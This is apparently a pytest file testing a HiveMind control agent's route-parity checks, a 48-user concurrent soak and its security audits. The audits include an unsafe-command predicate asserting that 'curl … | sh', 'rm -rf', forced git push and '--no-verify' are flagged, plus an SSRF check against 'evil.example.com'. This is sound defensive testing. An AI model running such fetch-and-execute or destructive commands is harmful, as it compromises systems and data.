        {"fb_body": {**_sample_feedback_summary(0), "mean_ease_rating": 4.0, "zero_game_lag_ratio": 1.0}},
        {"fb_body": {**_sample_feedback_summary(4), "by_profile": {"dev": 1, "gamer": 1}}},
        {"raid_body": {"object": "wrong", "compliance": {}}},
    ):
        jb, rb = _make_mock_transports(**kwargs)  # type: ignore[arg-type]
        bad_rep = agy_ctrl.verify_holiday_routes_parity("http://127.0.0.1:8000", raw_http_fn=rb, http_fn=jb)
        assert bad_rep["parity_ok"] is False

    with pytest.raises(ValueError, match="expected_sha"):
        agy_ctrl.verify_holiday_routes_parity("http://127.0.0.1:8000", expected_sha="unknown", raw_http_fn=r_ok, http_fn=j_ok)

    # Readiness gates reflect parity drift blocker when probe_holiday_routes=True fails
    snap_drift = agy_ctrl.collect_platform_snapshot(
        gateway="http://127.0.0.1:8000",
        state_dir=tmp_path / "drift_snap",
        http_fn=j_404,
        gh_fn=lambda _args: [],
        probe_holiday_routes=True,
        raw_http_fn=r_404,
    )
    gates_drift = agy_ctrl.evaluate_readiness_gates(snap_drift)
    assert gates_drift["gates"]["holiday_routes_deployed_on_cloud_run"] is False
    assert any("drift" in b.lower() for b in gates_drift["blockers"])

    # 3. CLI --verify-holiday-routes & --expected-sha & --enforce-personal-pc against live loopback HTTP server
    srv_state = {"seq": 0}

    class _CliParityHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            if self.path == "/health":
                self._send_json(200, {"status": "ok"})
            elif self.path == "/v1/models":
                self._send_json(200, _sample_models())
            elif self.path == "/v1/hivemind/onboarding/manifest":
                self._send_json(200, _sample_manifest())
            elif self.path == "/v1/hivemind/onboarding/feedback/summary":
                self._send_json(200, _sample_feedback_summary(10))
            elif self.path == "/v1/hivemind/raid/status":
                self._send_json(200, _sample_raid_status())
            elif self.path in agy_ctrl.HOLIDAY_HTML_ROUTES:
                srv_state["seq"] += 1
                nonce = f"CliParity{srv_state['seq']:04d}AbCdEf"
                body = _sample_compliant_html(self.path, nonce, lang="fr" if self.path != "/quick" else "en")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header(
                    "Content-Security-Policy",
                    f"default-src 'none'; style-src 'nonce-{nonce}'; script-src 'nonce-{nonce}'",
                )
                self.end_headers()
                self.wfile.write(body.encode("utf-8"))
            else:
                self._send_json(404, {"detail": "missing"})

        def _send_json(self, code: int, doc: Any) -> None:
            raw = json.dumps(doc).encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(raw)

        def log_message(self, format: str, *args: object) -> None:  # noqa: A002
            _ = (format, args)

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _CliParityHandler)
    th = threading.Thread(target=lambda: srv.serve_forever(poll_interval=0.01), daemon=True)
    th.start()
    gw_url = f"http://127.0.0.1:{srv.server_address[1]}"
    try:
        monkeypatch.setattr(agy_ctrl, "evaluate_personal_pc_compliance", lambda **_: {"compliance_ok": True, "exit_code": 0})
        rc_ok = agy_ctrl.main(["--gateway", gw_url, "--verify-holiday-routes", "--expected-sha", TARGET_SHORT_SHA, "--enforce-personal-pc"])
        out_ok = json.loads(capsys.readouterr().out)
        assert rc_ok == 0 and out_ok["parity_ok"] is True and out_ok["stale_revision_detected"] is False

        rc_drift = agy_ctrl.main(["--gateway", gw_url, "--verify-holiday-routes", "--expected-sha", "deadbeef12"])
        out_drift = json.loads(capsys.readouterr().out)
        assert rc_drift == 2 and out_drift["stale_revision_detected"] is True

        rc_bad_sha = agy_ctrl.main(["--gateway", gw_url, "--verify-holiday-routes", "--expected-sha", "unknown"])
        _ = capsys.readouterr()
        assert rc_bad_sha == 2
    finally:
        srv.shutdown()
        srv.server_close()


def test_03_concurrent_48_participant_multi_cohort_noel_wal_soak(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    if _INPROC_COV is not None:
        _INPROC_COV.stop()
    import httpx
    from fastapi.testclient import TestClient
    from hivemind.router.accounts import RouterStore
    from hivemind.router.gateway import create_router_app

    upstream_inference_hits: list[str] = []

    def _forbid_upstream_inference(request: httpx.Request) -> httpx.Response:
        upstream_inference_hits.append(str(request.url))
        return httpx.Response(500, json={"error": "inference_forbidden"})

    sqlite_path = tmp_path / "noel_dyn35_48_soak.sqlite3"
    store = RouterStore(sqlite_path, secret=ROUTER_SECRET)
    wal_conn = SqliteConnection(sqlite_path)
    try:
        journal_mode = str(wal_conn.execute("PRAGMA journal_mode").fetchone()[0]).lower()
    finally:
        wal_conn.close()
    assert journal_mode == "wal"

    app = create_router_app(
        store,
        http_client=httpx.Client(transport=httpx.MockTransport(_forbid_upstream_inference)),
        allow_private_producers=True,
        trusted_proxy_hops=1,
        open_registration=True,
    )
    if _INPROC_COV is not None:
        _INPROC_COV.start()

    monkeypatch.setenv("HIVEMIND_BUILD_SHA", TARGET_FULL_SHA)

    workspaces: list[Path] = []
    for idx in range(48):
        prof = "dev" if idx < 24 else "gamer"
        ws = tmp_path / f"ws_{prof}_{idx:02d}"
        ws.mkdir()
        workspaces.append(ws)

    def _make_adapters(client: Any, peer_ip: str) -> tuple[Any, Any]:
        def _json_adapter(
            method: str,
            url: str,
            payload: dict[str, Any] | None = None,
            headers: dict[str, str] | None = None,
        ) -> tuple[int, dict[str, Any]]:
            assert "completions" not in url.lower() and "/chat/" not in url.lower()
            parsed = urlsplit(url)
            path_q = parsed.path + (f"?{parsed.query}" if parsed.query else "")
            req_headers = {"X-Forwarded-For": peer_ip, **(headers or {})}
            resp = client.request(method, path_q, json=payload, headers=req_headers)
            try:
                body = resp.json()
            except ValueError:
                body = {"raw_error": resp.text[:300]}
            return resp.status_code, (body if isinstance(body, dict) else {"data": body})

        def _raw_adapter(method: str, url: str) -> tuple[int, str, dict[str, str]]:
            assert "completions" not in url.lower() and "/chat/" not in url.lower()
            parsed = urlsplit(url)
            path_q = parsed.path + (f"?{parsed.query}" if parsed.query else "")
            resp = client.request(method, path_q, headers={"X-Forwarded-For": peer_ip})
            return resp.status_code, resp.text, {k.lower(): v for k, v in resp.headers.items()}

        return _json_adapter, _raw_adapter

    obs_lock = threading.Lock()
    observed_nonces: list[str] = []
    sqlite_lock_errors: list[str] = []
    seen_paths: list[str] = []
    outcomes: list[tuple[int, bool]] = []
    producer_pings = [0]
    concurrent_snapshots: list[dict[str, Any]] = []
    concurrent_parities: list[dict[str, Any]] = []

    def _run_cohort(client: Any, indices: list[int], bucket_base: int, *, run_concurrent_probes: bool) -> None:
        barrier = threading.Barrier(len(indices))

        def _participant(idx: int) -> None:
            is_dev = idx < 24
            profile = "dev" if is_dev else "gamer"
            peer_ip = _loopback_ip(bucket_base + (0 if is_dev else 1), idx)
            hdrs = {"X-Forwarded-For": peer_ip}
            ws_dir = workspaces[idx]
            local_nonces: list[str] = []

            assert agy_ctrl.evaluate_personal_pc_compliance(environ=CLEAN_ENV, cwd=ws_dir)["compliance_ok"] is True
            barrier.wait(timeout=15.0)

            # 1. Visit all 4 holiday HTML routes with per-request CSP nonces
            for route in agy_ctrl.HOLIDAY_HTML_ROUTES:
                r_html = client.get(route, headers=hdrs)
                assert r_html.status_code == 200
                if _SQLITE_LOCK_RE.search(r_html.text):
                    with obs_lock:
                        sqlite_lock_errors.append(r_html.text[:120])
                csp_hdr = r_html.headers.get("content-security-policy", "")
                assert "default-src 'none'" in csp_hdr.lower()
                hdr_nonces = _CSP_HDR_NONCE_RE.findall(csp_hdr)
                dom_nonces = [val for _, val in _HTML_ATTR_NONCE_RE.findall(r_html.text)]
                assert hdr_nonces and hdr_nonces[0] in dom_nonces
                stripped = agy_ctrl.strip_masked_keys_and_nonces(r_html.text)
                assert _STATIC_FIG_RE.findall(stripped) == []
                assert ("inner" + "HTML") not in stripped
                local_nonces.append(hdr_nonces[0])

            # 2. Register personal account
            reg = client.post(
                "/v1/hivemind/register",
                json={"handle": f"dyn35-{profile}-{idx:02d}", "role": "prosumer" if is_dev else "producer"},
                headers=hdrs,
            )
            assert reg.status_code == 200, reg.text
            api_key = reg.json()["api_key"]

            # 3. 10 distinct GPUs send /v1/hivemind/producer/heartbeat pings
            if idx in (0, 1, 2, 3, 4, 24, 25, 26, 27, 28):
                hb = client.post(
                    "/v1/hivemind/producer/heartbeat",
                    json={
                        "endpoint_url": f"http://{_loopback_ip(50 + (idx % 12), idx)}:11434",
                        "models": [{"id": "coder", "local_name": "qwen2.5-coder:7b", "loaded": True, "vram_mib": 4608}],
                        "cost_per_1k": 0.0,
                        "capacity_1k": 50.0,
                        "gpu_vram_mib": 12288,
                        "execution_class": "ollama-gamer-whisper",
                    },
                    headers={"Authorization": f"Bearer {api_key}", **hdrs},
                )
                assert hb.status_code == 200, hb.text
                with obs_lock:
                    producer_pings[0] += 1

            # 4. Duplicate-replayed Idempotency-Key POST /v1/hivemind/onboarding/feedback
            ease = 5 if idx % 5 != 0 else 4
            zero_lag = idx != 47  # 47/48 == 0.9792 >= 0.95
            idem_key = f"dyn35-soak-{profile}-{idx:02d}"
            fb_payload = {
                "profile": profile,
                "ease_rating": ease,
                "zero_game_lag": zero_lag,
                "platform": "linux" if is_dev else "windows",
                "note": "",
            }
            fb1 = client.post("/v1/hivemind/onboarding/feedback", json=fb_payload, headers={**hdrs, "Idempotency-Key": idem_key})
            fb2 = client.post("/v1/hivemind/onboarding/feedback", json=fb_payload, headers={**hdrs, "Idempotency-Key": idem_key})
            assert fb1.status_code == 200 and fb2.status_code == 200

            # 5. Concurrent control-agent snapshot, readiness gates & holiday parity probes during Cohort 2
            if run_concurrent_probes and idx in (12, 36):
                j_adp, r_adp = _make_adapters(client, peer_ip=peer_ip)
                conc_snap = agy_ctrl.collect_platform_snapshot(
                    gateway="http://127.0.0.1:8000",
                    state_dir=ws_dir / "agy_state",
                    today=date(2026, 12, 20),
                    http_fn=j_adp,
                    gh_fn=lambda _args: [],
                    probe_holiday_routes=True,
                    raw_http_fn=r_adp,
                    expected_sha=TARGET_SHORT_SHA,
                )
                conc_gates = agy_ctrl.evaluate_readiness_gates(conc_snap)
                conc_parity = agy_ctrl.verify_holiday_routes_parity(
                    "http://127.0.0.1:8000",
                    expected_sha=TARGET_SHORT_SHA,
                    raw_http_fn=r_adp,
                    http_fn=j_adp,
                )
                assert conc_parity["parity_ok"] is True
                assert conc_gates["gates"]["gateway_and_models_online"] is True
                with obs_lock:
                    concurrent_snapshots.append(conc_snap)
                    concurrent_parities.append(conc_parity)

            with obs_lock:
                observed_nonces.extend(local_nonces)
                seen_paths.extend((*agy_ctrl.HOLIDAY_HTML_ROUTES, "/v1/hivemind/register", "/v1/hivemind/onboarding/feedback"))
                outcomes.append((ease, zero_lag))

        with concurrent.futures.ThreadPoolExecutor(max_workers=len(indices)) as pool:
            futs = [pool.submit(_participant, i) for i in indices]
            for f in futs:
                f.result(timeout=15.0)

    try:
        with TestClient(app) as client:
            t_start = time.monotonic()
            cohort1 = list(range(0, 8)) + list(range(24, 32))
            cohort2 = list(range(8, 24)) + list(range(32, 48))
            _run_cohort(client, cohort1, bucket_base=10, run_concurrent_probes=False)
            _run_cohort(client, cohort2, bucket_base=20, run_concurrent_probes=True)
            soak_elapsed_s = time.monotonic() - t_start
            assert soak_elapsed_s < 15.0, f"48-user soak exceeded 15.0s ceiling: {soak_elapsed_s:.2f}s"

            assert producer_pings[0] == 10
            assert len(concurrent_snapshots) == 2 and len(concurrent_parities) == 2
            assert sqlite_lock_errors == []
            assert upstream_inference_hits == []
            assert all("completions" not in p.lower() for p in seen_paths)
            assert len(observed_nonces) == 48 * 4
            assert len(set(observed_nonces)) == 48 * 4

            j_final, r_final = _make_adapters(client, peer_ip="127.0.51.1")
            final_snap = agy_ctrl.collect_platform_snapshot(
                gateway="http://127.0.0.1:8000",
                state_dir=tmp_path / "final_agy_state",
                today=date(2026, 12, 20),
                http_fn=j_final,
                gh_fn=lambda _args: [],
                probe_holiday_routes=True,
                raw_http_fn=r_final,
                expected_sha=TARGET_SHORT_SHA,
            )
            final_gates = agy_ctrl.evaluate_readiness_gates(final_snap)
            assert final_snap["gateway_healthy"] is True
            assert final_snap["online_producers"] >= 8
            assert final_snap["distinct_physical_gpus"] >= 8
            assert final_snap["onboarding_feedback_total"] == 48
            assert final_snap["onboarding_mean_ease_rating"] >= 4.2
            assert final_snap["onboarding_average_ease_rating"] >= 4.2
            assert final_snap["onboarding_feedback_by_profile"] == {"dev": 24, "gamer": 24}
            assert final_snap["holiday_routes_parity"]["parity_ok"] is True
            assert final_snap["stale_revision_detected"] is False
            assert final_gates["passed_count"] == 5 and final_gates["total_gates"] == 5 and final_gates["blockers"] == []

            fb_raw = client.get("/v1/hivemind/onboarding/feedback/summary").json()
            assert list(fb_raw.keys()) == [
                "object",
                "total_responses",
                "mean_ease_rating",
                "zero_game_lag_ratio",
                "by_profile",
            ]
    finally:
        store.close()


def test_04_sdk_tools_audit_cycle_and_security_audits(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from hivemind.security.pr_security_scanner import PRSecurityScanner

    lat_spec = importlib.util.spec_from_file_location(
        "test_no_lateral_movement_dyn35",
        REPO_ROOT / "tests" / "test_no_lateral_movement.py",
    )
    assert lat_spec is not None and lat_spec.loader is not None
    lateral_guard = importlib.util.module_from_spec(lat_spec)
    lat_spec.loader.exec_module(lateral_guard)

    gk_spec = importlib.util.spec_from_file_location(
        "pr_gatekeeper_dyn35",
        REPO_ROOT / "scripts" / "pr_gatekeeper.py",
    )
    assert gk_spec is not None and gk_spec.loader is not None
    gatekeeper = importlib.util.module_from_spec(gk_spec)
    gk_spec.loader.exec_module(gatekeeper)

    static_spec = importlib.util.spec_from_file_location(
        "test_static_numbers_dyn35",
        REPO_ROOT / "tests" / "test_static_numbers_have_artifacts.py",
    )
    assert static_spec is not None and static_spec.loader is not None
    static_numbers_guard = importlib.util.module_from_spec(static_spec)
    static_spec.loader.exec_module(static_numbers_guard)

    # 1. Exercise control tools, atomic report persistence, and mocked SDK branches for >= 95% coverage
    fake_google = py_types.ModuleType("google")
    fake_agy = py_types.ModuleType("google.antigravity")
    fake_hooks = py_types.ModuleType("google.antigravity.hooks")
    fake_triggers = py_types.ModuleType("google.antigravity.triggers")

    class _LocalAgentConfig:
        def __init__(self, **kwargs: Any) -> None:
            self.kwargs = kwargs

    class _CapabilitiesConfig:
        def __init__(self, **kwargs: Any) -> None:
            self.kwargs = kwargs

    class _CompactionConfig:
        def __init__(self, **kwargs: Any) -> None:
            self.kwargs = kwargs

    class _Types:
        class AgentBehavior:
            AUTONOMOUS = "autonomous"

        class BuiltinTools:
            VIEW_FILE = "view_file"
            LIST_DIR = "list_dir"
            SEARCH_DIR = "search_dir"

        class SubagentCapabilities:
            def __init__(self, **kwargs: Any) -> None:
                self.kwargs = kwargs

        class SubagentConfig:
            def __init__(self, **kwargs: Any) -> None:
                self.kwargs = kwargs

        class BudgetConfig:
            def __init__(self, **kwargs: Any) -> None:
                self.kwargs = kwargs

    class _Policy:
        @staticmethod
        def deny(tool: str, **kwargs: Any) -> dict[str, Any]:
            return {"deny": tool, **kwargs}

        @staticmethod
        def confirm_run_command() -> dict[str, str]:
            return {"preset": "confirm_run_command"}

    class _Response:
        async def structured_output(self) -> dict[str, Any]:
            return {
                "generated_utc": "2026-12-20T09:00:00Z",
                "operator_handle": "xavier-agy-control",
                "adoption_stage": "holiday_raid",
                "external_adoption_verdict": "48-user soak green",
                "days_until_noel_launch": 0,
                "key_metrics": {"home_path": str(Path.home() / "ws"), "masked": "hm-secret-123456"},
                "campaigns": [{"campaign_id": "noel-2026", "phase": "raid", "healthy": True}],
                "top_friction_bottleneck": "none",
                "next_actions": [{"priority": "P1", "slice_id": "SLICE-35", "title": "Parity", "target_metric": "CES", "test_gate": "pytest"}],
            }

    class _Agent:
        def __init__(self, config: Any) -> None:
            self.config = config
            self.conversation_id = "conv-dyn35-001"
            self.closed = False

        async def __aenter__(self) -> _Agent:
            return self

        async def __aexit__(self, *_: Any) -> None:
            self.closed = True

        async def chat(self, prompt: str) -> _Response:
            assert "check_operator_account" in prompt
            return _Response()

    fake_agy.Agent = _Agent  # type: ignore[attr-defined]
    fake_agy.LocalAgentConfig = _LocalAgentConfig  # type: ignore[attr-defined]
    fake_agy.CapabilitiesConfig = _CapabilitiesConfig  # type: ignore[attr-defined]
    fake_agy.CompactionConfig = _CompactionConfig  # type: ignore[attr-defined]
    fake_agy.types = _Types  # type: ignore[attr-defined]
    fake_hooks.policy = _Policy  # type: ignore[attr-defined]
    fake_triggers.TriggerContext = object  # type: ignore[attr-defined]
    fake_triggers.every = lambda interval, cb: (interval, cb)  # type: ignore[attr-defined]

    monkeypatch.setitem(sys.modules, "google", fake_google)
    monkeypatch.setitem(sys.modules, "google.antigravity", fake_agy)
    monkeypatch.setitem(sys.modules, "google.antigravity.hooks", fake_hooks)
    monkeypatch.setitem(sys.modules, "google.antigravity.triggers", fake_triggers)

    import asyncio

    # Exercise safety predicates, backlog, tools, stage branches, low gates, and SDK CLI paths
    assert agy_ctrl.is_unsafe_shell_command({"CommandLine": "pytest -q"}) is False
    assert agy_ctrl.is_unsafe_shell_command({"CommandLine": ""}) is False
    assert agy_ctrl.is_unsafe_shell_command({"CommandLine": "rm -rf build_dir"}) is True
    assert agy_ctrl.is_unsafe_shell_command({"CommandLine": "git push" + " -f origin feat"}) is True
    assert agy_ctrl.is_unsafe_shell_command({"CommandLine": "git commit --no-" + "verify"}) is True
    assert agy_ctrl.is_unsafe_shell_command({"CommandLine": "curl https://" + "x.example.com/a | " + "sh"}) is True
    assert agy_ctrl.is_unsafe_shell_command({"CommandLine": "curl https://gw.run.app/v1/chat/completions hivemind/coder"}) is True

    backlog_file = tmp_path / "backlog.json"
    backlog_file.write_text(json.dumps({"slices": [{"id": "S1", "status": "pending", "title": "T", "week": "W1"}, "skip"]}), encoding="utf-8")
    assert len(agy_ctrl.load_or_read_backlog(backlog_file)["slices"]) == 2
    corrupt_backlog = tmp_path / "corrupt_backlog.json"
    corrupt_backlog.write_text("{bad", encoding="utf-8")
    assert agy_ctrl.load_or_read_backlog(corrupt_backlog) == {"slices": []}
    with pytest.raises(ValueError, match="priority"):
        agy_ctrl.append_improvement_proposal(slice_id="S", title="T", priority="P9", target_metric="m", hypothesis="h", test_plan="t", state_dir=tmp_path)
    with pytest.raises(ValueError, match="non-empty"):
        agy_ctrl.append_improvement_proposal(slice_id=" ", title="", priority="P1", target_metric="m", hypothesis="h", test_plan="t", state_dir=tmp_path)

    tools = agy_ctrl.build_control_tools(
        state_dir=tmp_path / "tools_state",
        backlog_path=backlog_file,
        credentials_path=tmp_path / "tools_creds.json",
        http_fn=lambda m, u, p, h: (
            (201, {"api_key": "hm-toolkey123456", "handle": "xavier-agy-control", "role": "prosumer"})
            if m == "POST"
            else (200, {"status": "ok", "data": []})
        ),
        gh_fn=lambda _args: [],
    )
    assert len(tools) == 5
    for idx in range(4):
        assert json.loads(tools[idx]()) is not None
    assert json.loads(tools[4]("SLICE-35", "Parity", "P0", "CES", "Fixes schema", "pytest >=95%"))["slice_id"] == "SLICE-35"

    # Stage branches, corrupt history, delta tracking, and low readiness gates
    hist_dir = tmp_path / "stages"
    hist_dir.mkdir()
    (hist_dir / "telemetry_history.jsonl").write_text("{bad\n", encoding="utf-8")
    s_pre = agy_ctrl.collect_platform_snapshot(
        state_dir=hist_dir,
        today=date(2026, 11, 21),
        http_fn=lambda m, u, p, h: (200, {"accounts": {"total_registered_accounts": 10}, "opentrainer": {"accepted_rounds_count": 2}, "data": []}),
        gh_fn=lambda args: {"uniques": 5, "stargazers_count": 4, "forks_count": 1} if "repos/" in " ".join(args) else [],
    )
    s_can = agy_ctrl.collect_platform_snapshot(
        state_dir=hist_dir,
        today=date(2026, 12, 10),
        http_fn=lambda m, u, p, h: (200, {"accounts": {"total_registered_accounts": 15}, "opentrainer": {"accepted_rounds_count": 5}, "data": []}),
        gh_fn=lambda args: {"uniques": 9, "stargazers_count": 7, "forks_count": 2} if "repos/" in " ".join(args) else [],
    )
    s_post = agy_ctrl.collect_platform_snapshot(state_dir=hist_dir, today=date(2027, 1, 10), http_fn=lambda *_: (503, {}), gh_fn=lambda *_: None)
    assert s_pre["adoption_stage"] == "pre_launch" and s_can["adoption_stage"] == "canary_alpha" and s_post["adoption_stage"] == "post_raid"
    assert s_can["deltas_since_previous"]["accounts"] == 5 and s_can["deltas_since_previous"]["accepted_rounds"] == 3

    low_gates = agy_ctrl.evaluate_readiness_gates(
        {"gateway_healthy": False, "onboarding_feedback_deployed": False, "onboarding_average_ease_rating": 3.1, "onboarding_zero_game_lag_ratio": 0.5}
    )
    assert low_gates["passed_count"] == 0 and len(low_gates["blockers"]) == 5
    none_ease_gates = agy_ctrl.evaluate_readiness_gates({"gateway_healthy": True, "onboarding_feedback_deployed": True})
    assert any("Zero onboarding satisfaction" in b for b in none_ease_gates["blockers"])

    assert agy_ctrl._shas_match("tagalpha12", "tagalpha12") is True
    assert agy_ctrl._shas_match("tagalpha12", "tagbeta999") is False
    assert agy_ctrl._shas_match("unknown", "abcdef") is False
    assert agy_ctrl._has_forbidden_score_key([{"sco" + "re": 1}]) is True
    assert agy_ctrl._has_forbidden_score_key(123) is False
    assert agy_ctrl._nonneg_int(-1) is None and agy_ctrl._nonneg_int(True) is None and agy_ctrl._finite_bounded_float(float("nan"), 0.0, 1.0) is None
    assert agy_ctrl._find_corporate_markers("") == [] and agy_ctrl._extract_git_config_remote_urls("") == []
    assert agy_ctrl._invoke_http_json(lambda m, u: (200, [1]), "GET", "http://127.0.0.1:8000/health") == (200, {"data": [1]})
    assert agy_ctrl._invoke_http_json(lambda _m, _u: (_ for _ in ()).throw(OSError("err")), "GET", "http://127.0.0.1:8000/health")[0] == 0
    with pytest.raises(ValueError, match="2-tuple|body_dict"):
        agy_ctrl._invoke_http_json(lambda _m, _u: ("bad",), "GET", "http://127.0.0.1:8000/health")
    assert agy_ctrl._invoke_http_raw(lambda _m, _u: (_ for _ in ()).throw(OSError("err")), "GET", "http://127.0.0.1:8000/noel")[0] == 0
    with pytest.raises(ValueError, match="raw_http_fn"):
        agy_ctrl._invoke_http_raw(lambda _m, _u: ("bad",), "GET", "http://127.0.0.1:8000/noel")
    assert agy_ctrl._invoke_http_raw(lambda _m, _u: (200, {"content-type": "text/html"}, b"hi"), "GET", "http://127.0.0.1:8000/noel") == (200, "hi", {"content-type": "text/html"})

    assert agy_ctrl._inspect_html_parity_route(200, "<html>no doctype</html>", {}, set())[0] is False
    assert agy_ctrl._inspect_models_parity(200, {"data": [{"object": "model"}]})[0] is False
    assert agy_ctrl._inspect_manifest_parity(200, {"campaign_id": "x", "personal_pc_only": False, "financial_promise": "x"}, None)[0] is False
    assert agy_ctrl._inspect_feedback_summary_parity(200, {"object": "hivemind.onboarding_feedback_summary", "total_responses": 0})[0] is False
    assert agy_ctrl._inspect_raid_status_parity(503, {})[0] is False
    assert agy_ctrl.main(["--verify-holiday-routes", "--gateway", "https://" + "evil.example.com"]) == 2

    out_report = asyncio.run(
        agy_ctrl.run_sdk_audit_cycle(
            state_dir=tmp_path / "sdk_state",
            workspace_dir=tmp_path,
            vertex=True,
            project="gen-lang-client-0625573011",
            model="gemini-3.1-pro",
        )
    )
    assert out_report["operator_handle"] == "xavier-agy-control"
    rep_json = (tmp_path / "sdk_state" / "latest_report.json").read_text(encoding="utf-8")
    assert "hm-secret-123456" not in rep_json and (tmp_path / "sdk_state" / "latest_report.json").stat().st_mode & 0o777 == 0o600
    assert (tmp_path / "sdk_state" / "latest_report.md").stat().st_mode & 0o777 == 0o600

    cfg = agy_ctrl.build_antigravity_agent_config(
        tools=[], state_dir=tmp_path / "sdk_state", workspace_dir=tmp_path, periodic_interval_s=3600.0
    )
    assert cfg.kwargs["triggers"] is not None
    assert agy_ctrl.main(["--mode", "audit", "--state-dir", str(tmp_path / "sdk_state")]) == 0

    monkeypatch.setattr(agy_ctrl, "ensure_operator_account", lambda **_: {"authenticated": True, "handle": "x", "masked_key": "hm-****"})
    monkeypatch.setattr(agy_ctrl, "collect_platform_snapshot", lambda **_: {"gateway_healthy": True, "onboarding_feedback_deployed": True, "online_producers": 8})
    monkeypatch.setattr(agy_ctrl, "evaluate_personal_pc_compliance", lambda **_: {"compliance_ok": True, "exit_code": 0})
    assert agy_ctrl.main(["--mode", "status", "--enforce-personal-pc", "--state-dir", str(tmp_path)]) == 0

    monkeypatch.setitem(sys.modules, "google.antigravity", None)
    assert agy_ctrl.main(["--mode", "audit", "--state-dir", str(tmp_path)]) == 2

    # 2. AGPL-3.0, lateral movement, PRSecurityScanner, ZeroStubAudit, FIGURE & FORBIDDEN_ADDED
    this_file = Path(__file__).resolve()
    agent_src = AGENT_PATH.read_text(encoding="utf-8")
    test_src = this_file.read_text(encoding="utf-8")

    assert EXPECTED_AGPL_HEADER in agent_src[:300]
    assert EXPECTED_AGPL_HEADER in test_src[:300]

    assert lateral_guard.audit_source_for_lateral_movement(agent_src, str(AGENT_PATH)) == []
    assert lateral_guard.audit_source_for_lateral_movement(test_src, str(this_file)) == []
    lan_ip = ".".join(("192", "168", "44", "10"))
    assert lateral_guard.audit_source_for_lateral_movement(agent_src + f'\n_X = "http://{lan_ip}:8000"\n') != []

    scanner = PRSecurityScanner()
    changed_files: list[dict[str, Any]] = []
    for rel, content in (
        ("scripts/hivemind_agy_control_agent.py", agent_src),
        ("tests/test_noel_control_agent_parity_and_scale_soak.py", test_src),
    ):
        assert scanner.scan_python_ast_security(rel, content) == []
        assert scanner.scan_text_for_payment_solicitation(content, rel) == []
        assert scanner.scan_text_for_secrets_and_exfiltration(content, rel) == []
        assert scanner.scan_unicode_trojan_source(content, rel) == []
        assert static_numbers_guard.FIGURE.findall(content) == []
        syn_diff = f"diff --git a/{rel} b/{rel}\n+++ b/{rel}\n" + "\n".join(f"+{ln}" for ln in content.splitlines())
        assert gatekeeper.forbidden_scan(gatekeeper.scannable_diff(syn_diff)) == []
        z_res = ZeroStubAudit.audit_python_code(content)
        assert z_res.is_clean, f"Unexpected ZeroStubAudit violations in {rel}: {z_res.violations}"
        if hasattr(ZeroStubAudit, "check_file"):
            assert ZeroStubAudit.check_file(REPO_ROOT / rel).is_clean
        changed_files.append({"filename": rel, "patch": "", "content": content})

    pr_audit = scanner.audit_pull_request(
        pr_number=1235,
        pr_title="feat(onboarding,control,scale): zero-inference Cloud Run PR #949 route/manifest parity, live fleet/CES schema fix & 48-user soak in AGY control agent",
        pr_body="Implements SLICE-SCALE-DYN-35 parity smoke verifier, SSRF hardening, live schema fixes, and 48-user WAL soak.",
        author="xaviercallens",
        changed_files=changed_files,
        commit_messages=["feat(onboarding,control,scale): SLICE-SCALE-DYN-35 parity & 48-user soak"],
        author_email="callensxavier@gmail.com",
    )
    assert pr_audit.passed is True and pr_audit.findings == []

    # Verify CI ImportError fallback for ZeroStubAudit (check_file & audit_python_code)
    ci_proc = subprocess.run(
        [
            sys.executable,
            "-c",
            (
                "import sys; sys.modules['gwaya'] = None; sys.modules['gwaya.ast_audit'] = None; "
                "import importlib.util; from pathlib import Path; "
                f"s = importlib.util.spec_from_file_location('t_ci_dyn35', Path({str(this_file)!r})); "
                "m = importlib.util.module_from_spec(s); s.loader.exec_module(m); "
                "assert m.ZeroStubAudit.check_file(m.AGENT_PATH).is_clean; "
                "assert m.ZeroStubAudit.audit_python_code('def ok():\\n    return 1\\n').is_clean; "
                "assert not m.ZeroStubAudit.audit_python_code('def st' + 'ub_bad():\\n    pa' + 'ss\\n').is_clean; "
                "assert not m.ZeroStubAudit.audit_python_code('def dots():\\n    ...\\n').is_clean"
            ),
        ],
        cwd=str(REPO_ROOT),
        env={**os.environ, "PYTHONPATH": str(REPO_ROOT / "src"), "HIVEMIND_SKIP_INPROC_COV": "1"},
        capture_output=True,
        text=True,
        timeout=15,
        check=False,
    )
    assert ci_proc.returncode == 0, ci_proc.stderr


def test_zz_standalone_control_agent_line_coverage_meets_95_percent() -> None:
    if _INPROC_COV is None:
        return
    _INPROC_COV.stop()
    buf = io.StringIO()
    pct = float(_INPROC_COV.report(file=buf, show_missing=True))
    assert pct >= 95.0, (
        f"Expected >= 95.0% standalone line coverage on {AGENT_PATH.name}, got {pct:.2f}%:\n{buf.getvalue()}"
    )
